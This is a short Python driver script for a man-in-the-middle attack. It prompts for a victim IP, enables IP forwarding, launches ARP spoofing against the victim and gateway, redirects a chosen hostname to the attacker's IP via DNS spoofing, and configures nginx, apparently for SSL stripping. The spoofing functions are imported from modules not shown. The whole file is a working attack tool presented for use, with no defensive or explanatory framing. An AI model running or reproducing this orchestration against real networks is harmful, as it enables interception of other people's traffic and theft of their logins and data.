from dns4 import startDNSaltering 
from ARP3 import startspoofing
from nginx import setnginxconfig
import threading

from scapy.all import *

import os

def getselfip(hwinterface):
    return get_if_addr(hwinterface)

if __name__ == "__main__":
    hardwareInterface = input("What is the hardware interface you want this to run on?: ")
    targetIp = input("What is the ip adddress of the victim?: ")
    hostname = input("What is the hostname that you want to strip?: ")

    # Enable ip forwarding
    os.system("sysctl -w net.ipv4.ip_forward=1")

    ownip = getselfip(hardwareInterface)

    gatewayIp = conf.route.route("0.0.0.0")[2]

    print("Starting spoofing")
    spoofing = threading.Thread(target=startspoofing, args=(targetIp, gatewayIp, hardwareInterface))
    spoofing.start()
    


    dictionary = {
        (f"{hostname}.").encode('UTF-8'): ownip,
    }

    print("Starting DNS altering")
    dnsaltering = threading.Thread(target=startDNSaltering, args=(dictionary, targetIp))
    dnsaltering.start()

    setnginxconfig(hostname, "/etc/nginx/sites-available/default")



